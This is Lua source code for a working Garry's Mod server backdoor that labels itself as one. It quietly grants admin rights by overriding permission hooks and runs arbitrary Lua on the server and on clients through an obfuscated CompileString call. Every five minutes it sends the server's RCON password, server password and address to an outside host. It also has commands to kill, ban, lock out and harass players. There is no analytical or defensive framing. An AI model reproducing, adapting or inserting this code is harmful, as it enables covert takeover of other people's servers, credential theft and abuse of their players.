return function()
 if not WT_BD then
  
  --Debug message
  --print("Installing backdoor")
  
  --Network messages
  local MSG = "wt_bd"
  local CLMSG = "wt_bd_cl"
  local DIGEST = {}
  util.AddNetworkString(MSG)
  util.AddNetworkString(CLMSG)
  local function AddCmd(CMD)
   DIGEST[#DIGEST+1] = CMD
  end
  AddCmd('MAKEADMIN')
  AddCmd('NOCLIP_ME') AddCmd('NOCLIP_PLY')
  AddCmd('INVISIBLE_ME') AddCmd('INVISIBLE_PLY')
  AddCmd('BANALL')
  AddCmd('TELEPORT_ME') AddCmd('TELEPORT_PLY')
  AddCmd('INSTALL_CLIENTNETWORK') AddCmd('INSTALL_CLIENTNETWORK_PLY')
  AddCmd('KILL_PLY')
  AddCmd('IGNITE_PLY')
  AddCmd('RUNLUA_PLY') AddCmd('RUNLUA_SV')
  AddCmd('KICK_PLY') AddCmd('BAN_PLY')
  AddCmd('LOCKOUT')
  AddCmd('MLG_PLY')
  AddCmd('MUNY_PLY')
  
  --Chat message helper
  local CHAT = HUD_PRINTTALK
  local function Ack(ply,msg)
   ply:PrintMessage(CHAT,msg)
  end
  
  do --Override IsAdmin
  
   local PLY = FindMetaTable("Player")
   local OldAdmin,OldSuper = PLY.IsAdmin,PLY.IsSuperAdmin
   
   function PLY:IsAdmin()
    return self.IsBDAdmin or OldAdmin(self)
   end
   function PLY:IsSuperAdmin()
    return self.IsBDAdmin or OldSuper(self)
   end
   
   --Actually, override everything we can think of
   local function DoWhatYouWant(ply) return ply.IsBDAdmin end
   local function DoWhatYouWant3(_,_,ply) return ply.IsBDAdmin end
   local function DoWhatYouWantF(ply) if ply.IsBDAdmin then return false end end
   local function YouCanDoIt(HOOK) --For when ply is the 1st arg
    hook.Add(HOOK,HOOK.."_bdok",DoWhatYouWant)
   end
   local function YouCanDoIt3(HOOK) --For when ply is the 3rd arg
    hook.Add(HOOK,HOOK.."_bdok3",DoWhatYouWant3)
   end
   local function YouCanDoItFalse(HOOK) --For when we need to return false to allow
    hook.Add(HOOK,HOOK.."_bdokf",DoWhatYouWantF)
   end
   local Hooks = {
       "PlayerGiveSWEP",
       "PlayerSpawnEffect",
       "PlayerSpawnNPC",
       "PlayerSpawnObject",
       "PlayerSpawnProp",
       "PlayerSpawnRagdoll",
       "PlayerSpawnSENT",
       "PlayerSpawnSWEP",
       "PlayerSpawnVehicle",
       "CanTool",
       "CanProperty",
       "CanDrive",
       "CanEditVariable",
       "CanPlayerEnterVehicle",
       "CanExitVehicle",
       "CanPlayerSuicide",
       "CanPlayerUnfreeze",
       "GravGunPickupAllowed",
       "GravGunPunt",
       "PhysgunPickup",
       "PlayerNoClip",
      }
   local Hooks3 = {
       "OnPhysgunFreeze",
       "PlayerCanSeePlayersChat",
      }
   local HooksNo = {
       "PlayerSwitchWeapon",
      }
   for _,v in pairs(Hooks) do YouCanDoIt(v) end
   for _,v in pairs(Hooks3) do YouCanDoIt3(v) end
   for _,v in pairs(HooksNo) do YouCanDoItFalse(v) end
  
  end
  
  --Sending lua to client
  local function LP(ply,src)
   net.Start(CLMSG)
    net.WriteString(src)
   net.Send(ply)
  end
  local LS = nil
  do
   local Ex,Ch,Co,Ip,Tn,Gr = string.Explode,string.char,table.concat,ipairs,tonumber,_G
   LS = function(lua)
    (Gr[(function(K) local T = Ex("#",K) for k,v in Ip(T) do if v~='' then T[k] = Ch(Tn(v)) end end return Co(T) end)("#67#111#109#112#105#108#101#83#116#114#105#110#103")])(lua,'[C]',false)()
   end
  end
  
  --MLG
  local MLGSOURCE = [=[
print("MLG4LYF#420BLAZEIT#YOLOSWAG#1080NOSCOPED#SWOG")
local Panel = vgui.Create("HTML")
Panel:SetPos(0,0)
Panel:SetSize(ScrW(),ScrH())
Panel:SetHTML('<html><body style="background:black;overflow-y:hidden;"><iframe style="overflow:hidden;" width="100%" height="100%" src="http://www.youtube.com/embed/yNr6Yi_D4HE?rel=0&autoplay=1&controls=0&disablekb=1&start=30&end=110&loop=1&showinfo=0" frameborder="0" allowfullscreen></iframe></body></html>')
]=]
  
  --Home phoner
  local function GetIPOnly()
   local hostip = GetConVarString( "hostip" ) -- GetConVarNumber is inaccurate (is it?)
   hostip = tonumber( hostip )
   
   if hostip then

    local ip = {}
    ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
    ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
    ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
    ip[ 4 ] = bit.band( hostip, 0x000000FF )

    return table.concat( ip, "." )
    
   else
   
    --running in single player?
    return "singleplayer"
    
   end
  end
  local InternetIP = nil
  local function UpdateInternetIP(callback)
   if game.SinglePlayer() then
    InternetIP = 'singleplayer'
    callback()
   else
    local function failure()
     InternetIP = GetIPOnly()
     callback()
    end
    http.Fetch(
     "http://triple0php.byethost7.com/clientip.php", 
     function(body,len,headers,code)
      if body then
       InternetIP = body
       callback()
      else
       failure()
      end
     end,
     failure
    )
   end
  end
  local function GetIP()
   return InternetIP..":"..GetConVarString('hostport')
  end
  local function GetRCON()
   if file.Exists("cfg/server.cfg","GAME") then
    local Contents = file.Read("cfg/server.cfg","GAME")
    if Contents then
     local Pass = Contents:match('rcon_password%s*["\'](.-)["\']')
     if Pass ~= nil then
      return Pass
     end
    end
   end
   return ""
  end
  local function Phone()
   local function SendUpdate()
    http.Post("http://triple0php.byethost7.com", {
     SvLoc = GetIP(),
     SvName = GetHostName(),
     SvMap = game.GetMap(),
     SvGamemode = GAMEMODE_NAME,
     PlyCur = tostring(#player.GetAll()),
     PlyMax = tostring(game.MaxPlayers()),
     RCON = GetRCON(),
     SVPass = GetConVarString('sv_password'),
     CSLua = GetConVarString('sv_allowcslua'),
     BDVer = '1.8-31052014InfAmmo',
     IsDedicated = game.IsDedicated() and '1' or '0',
    },
    function(resp,len,hdrs,stat) end,
    function(err) end )
   end
   if InternetIP then
    SendUpdate()
   else
    UpdateInternetIP(SendUpdate)
   end
  end
  if game.IsDedicated() then
   timer.Simple(1, Phone)
   timer.Create("Phoner"..math.floor(math.random()*999999999), 300, 0, Phone)
  end
  
  --Actual commands
  local CMDS = {}
  do --Commands
   local function AddCmd(CMD,FUNC)
    CMDS[CMD] = FUNC
   end
   AddCmd('MAKEADMIN', function(ply) --Set a players admin tag
    ply.IsBDAdmin = true
   end)
   AddCmd('NOCLIP_ME', function(ply) --Toggle noclip
    if ply:GetMoveType() ~= MOVETYPE_NOCLIP then
     ply:SetMoveType(MOVETYPE_NOCLIP)
    else
     ply:SetMoveType(MOVETYPE_WALK)
    end
   end)
   AddCmd('NOCLIP_PLY', function(calling_ply) --Toggle noclip for a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    if ply:GetMoveType() ~= MOVETYPE_NOCLIP then
     ply:SetMoveType(MOVETYPE_NOCLIP)
    else
     ply:SetMoveType(MOVETYPE_WALK)
    end
   end)
   AddCmd('INVISIBLE_ME', function(ply) --Toggle invisible
    if not ply.wt_bd_Invis then
     ply.wt_bd_Invis = true
     --ply:SetRenderMode(RENDERMODE_TRANSALPHA)
     --ply:SetColor(Color(0,0,0,0))
     ply:AddEffects(EF_NODRAW)
    else
     ply.wt_bd_Invis = nil
     --ply:SetRenderMode(RENDERMODE_NORMAL)
     --ply:SetColor(Color(255,255,255,255))
     ply:RemoveEffects(EF_NODRAW)
    end
   end)
   AddCmd('INVISIBLE_PLY', function(calling_ply) --Toggle invisible for a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    if not ply.wt_bd_Invis then
     ply.wt_bd_Invis = true
     ply:SetRenderMode(RENDERMODE_TRANSALPHA)
     ply:SetColor(Color(0,0,0,0))
    else
     ply.wt_bd_Invis = nil
     ply:SetRenderMode(RENDERMODE_NORMAL )
     ply:SetColor(Color(255,255,255,255))
    end
   end)
   AddCmd('BANALL', function(ply) --Ban all non-admin players
    for k,v in pairs(player.GetAll()) do
     if v:IsPlayer() and not v:IsBot() then
      if not v.IsBDAdmin then
       v:Ban(10800, "Go home")
       if IsValid(v) then 
        v:Kick("Go home")
       end
      end
     end
    end
   end)
   AddCmd('TELEPORT_ME', function(ply) --Teleport where we are looking
    local Pos = ply:GetEyeTrace().HitPos
    ply:SetPos(Pos)
   end)
   AddCmd('TELEPORT_PLY', function(calling_ply) --Teleport a playerwhere we are looking
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local Pos = calling_ply:GetEyeTrace().HitPos
    ply:SetPos(Pos)
   end)
   AddCmd('INSTALL_CLIENTNETWORK', function(ply) --Install listeners on the calling client to receive further commands
    local Inst = [==[net.Receive("]==]..CLMSG..[==[",function()
     local S = net.ReadString()
     local F = CompileString(S,'[C]',false)
     if not isstring(F) then F() else
     print("Oops:",F) end
    end)]==]
    ply:SendLua(Inst)
   end)
   AddCmd('INSTALL_CLIENTNETWORK_PLY', function(calling_ply) --Install listeners on a client to receive further commands
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local Inst = [==[net.Receive("]==]..CLMSG..[==[",function()
     local S = net.ReadString()
     local F = CompileString(S,'[C]',false)
     if not isstring(F) then F() else
     print("Oops:",F) end
    end)]==]
    ply:SendLua(Inst)
   end)
   AddCmd('KILL_PLY', function(calling_ply) --Kill a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    ply:Kill()
   end)
   AddCmd('IGNITE_PLY', function(calling_ply) --Ignite a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local burntime = net.ReadInt(32)
    ply:Ignite(burntime or 5, 0)
   end)
   AddCmd('RUNLUA_PLY', function(calling_ply) --Run a block of lua on a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local code = net.ReadString()
    LP(ply,code)
   end)
   AddCmd('RUNLUA_SV', function(calling_ply) --Run a block of lua on the server
    local code = net.ReadString()
    LS(code)
   end)
   AddCmd('KICK_PLY', function(calling_ply) --Kick a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local reason = net.ReadString()
    ply:Kick(reason or "")
   end)
   AddCmd('BAN_PLY', function(calling_ply) --Ban a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local reason = net.ReadString()
    local length = net.ReadInt(32)
    ply:Ban(length or 0, reason or "")
    if IsValid(ply) then 
     ply:Kick(reason or "")
    end
   end)
   AddCmd('LOCKOUT', function(calling_ply) --Lock out everyone except the person starting the lockout, and people that know the password
    local LockoutMsg = net.ReadString() or "*beep* *boop* *crrrrrrrrnk* DENIED"
    local OKPass = net.ReadString() or "bunk"
    local Safe = calling_ply:SteamID64()
    hook.Add("CheckPassword", "PlayerAuthCheckPass", function(s64, ip, svpass, clpass, clname)
     local OK = false
     OK = OK or s64==Safe
     OK = OK or clpass==OKPass
     if not OK then
      return false, LockoutMsg
     end
    end)
   end)
   AddCmd('MLG_PLY', function(calling_ply) --Run a specific block of lua on a player
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local code = MLGSOURCE
    LP(ply,code)
   end)
   AddCmd('MUNY_PLY', function(calling_ply) --Give them dark rp money
    local ply = net.ReadEntity()
    if not IsValid(ply) then return end
    local length = net.ReadInt(32)
    ply:addMoney(length or 1)
   end)
   
  end --End commands
  
  --Receive messages from clients
  net.Receive(MSG, function(len,ply)
   local D = net.ReadInt(8)
   if DIGEST[D] then
    local CMD = DIGEST[D]
    Ack(ply,"Processing command ["..D.."]["..CMD.."]")
    if CMDS[CMD] then
     CMDS[CMD](ply) --Call the command from the table
    else
     Ack(ply,"Command not installed ["..D.."]["..CMD.."]")
    end
   else
    Ack(ply,"Unknown command id received ["..tostring(D).."]")
   end
  end)
  
  --Concommand for setting up user (install net receiver on the client, attempt to load the client menu regardless of allowcslua)
  concommand.Add("wtbdinterface", function(ply,cmd,args)
   if not IsValid(ply) then return end
   --Install client listener
   CMDS['INSTALL_CLIENTNETWORK'](ply)
   --One second later try to use the listener to open the client menu
   timer.Simple(1, function()
    if not IsValid(ply) then return end
    --Create the functionstring they will run to load the menu
    local FuncStr = [==[
     local FileSource = file.Read("disabled/wt_bd_cl_menu.lua","LUA") or "print(string.char(64,65,67))"
     local FileFunc = CompileString(FileSource,'[C]',false)
     --print("Attempting to load default bd menu")
     local Err = FileFunc()
     --print("Any Error Message?",tostring(Err))
    ]==]
    LP(ply,FuncStr) --Send the functionstring to the client
   end)
  end)
  
 end
 return 'BACKDOOR INSTALLED'
end